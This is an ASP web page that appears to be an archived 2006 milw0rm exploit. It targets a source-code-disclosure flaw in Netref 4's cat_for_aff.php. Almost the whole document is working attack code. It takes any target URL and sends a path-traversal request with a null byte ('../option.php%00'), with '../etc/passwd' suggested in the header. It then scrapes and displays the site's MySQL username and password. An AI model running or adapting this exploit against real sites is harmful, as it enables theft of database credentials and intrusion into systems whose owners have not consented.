<% Response.Buffer = True %>
<% On Error Resume Next %>
<% Server.ScriptTimeout = 100 %>

<%
'===============================================================================================
'                          =>option.php Reader
'[Script Name: Netref 4 (cat_for_aff.php) Source Code Disclosure
'[Coded by   : ajann
'[Author   : ajann
'[Contact    : :(
'[ExploitName: exploit4.asp

'[Note : exploit file name =>exploit4.asp
'[Note : http://[target]/[path]/script/cat_for_aff.php?ad_direct=../etc/passwd    |etc...
'[Using : Write Target after Submit Click
'===============================================================================================

%>

<%
function guvenlik(username)
guvenlik = Replace(username," // Adresse du serveur MySQL","")
guvenlik = Replace(guvenlik," // Nom d'utilisateur de la base MySQL ","")
guvenlik = Replace(guvenlik," // Nom d'utilisateur MySQL","")
guvenlik = Replace(guvenlik," //Mot de passe MySQL","")
guvenlik = Replace(guvenlik," // Nom de la base MySQL","")
guvenlik = Replace(guvenlik," // Nom d'utilisateur de la base","")
guvenlik = Replace(guvenlik," MySQL","")
End Function
%>

<html>
<title>Netref 4 (cat_for_aff.php) Source Code Disclosure</title>
<head>

<script language="JavaScript">    
  function functionControl1(){  
        setTimeout("functionControl2()",2000);    
     }  
  
  function functionControl2(){  
            if(document.form1.field1.value==""){  
 
     alert("[Exploit Failed]=>The Username and Password Didnt Take,Try Again");
        
                             }  
                        }

  function writetext() {

            if(document.form1.field1.value==""){
document.getElementById('htmlAlani').innerHTML='<font face=\"Verdana\" size=\"1\" color=\"#008000\">There is a problem... The Data Didn\'t Take </font>'

                            }
                 }
  function write(){  
        setTimeout("writetext()",1000);    
     }  
  
</script>


</head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<body bgcolor="#000000" link="#008000" vlink="#008000" alink="#008000">

<center>
<font face="Verdana" size="2" color="#008000"><b><a href="exploit4.asp">Netref </b>v4 (cat_for_aff.php) <u><b>
Source Code Disclosure</b></u></a></font><br><br>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
  <tr>
    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">
    <font face="Arial" size="1"><b><font color="#FFFFFF">TARGET:</font>Example:[http://x.com/path]</b></font><p>
    </td>
    <td width="50%"><center>
<form method="post" name="form1" action="exploit4.asp?islem=get">
<input type="text" name="text1" value="http://" size="25" style="background-color: #808080">
<input type="submit" value="Get"></center></td>
  </tr>

</table>

<div id=htmlAlani></div>

<%
islem = Request.QueryString("islem")    
If islem = "hata1" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please complete to the whole spaces</font>"
End If
If islem = "hata2" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please right character use</font>"
End If
If islem = "hata3" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Add ""http://""</font>"
End If
%>

<%  

If islem = "get" Then

string1="/script"
string2="/cat_for_aff.php?"
string3="ad_direct=."
string4="./option"
string5=".php%0"
string6="0"

targettext = Request.Form("text1")
arama=InStr(1, targettext, "union" ,1)
arama2=InStr(1, targettext, "http://" ,1)

If targettext="" Then
Response.Redirect("exploit4.asp?islem=hata1")

Else
If arama>0 then 
Response.Redirect("exploit4.asp?islem=hata2")

Else
If arama2=0 then 
Response.Redirect("exploit4.asp?islem=hata3")

Else
%> 

<%

target1 = targettext+string1+string2+string3+string4+string5+string6

Public Function take(come)
Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
With objtake
  .Open "GET" , come, FALSE
  .sEnd
take =  .Responsetext
End With
SET objtake = Nothing
End Function

get_username = take(target1)

getdata=InStr(get_username,"<?" )
username=Mid(get_username,getdata+3,180)


%>


<center>
<font face="Verdana" size="2" color="#008000"> <u><b>
ajann<br></b></u></font>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
  <tr>
    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <b><font size="2" face="Arial">Data:</font></b></td>
    <td width="80%">
&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=guvenlik(username)%></b></font></p>
 </td>
  </tr>
  
</table>

<form method="POST" name="form2" action="#">    
<input type="hidden" name="field1" size="20" value="<%=username%>"></p>      
</form> 

</center>

<script language="JavaScript">
write()
functionControl1()
</script>

</body>
</html>

<%
End If
End If
End If
End If
Set objtake = Nothing 
%>

# milw0rm.com [2006-10-29]
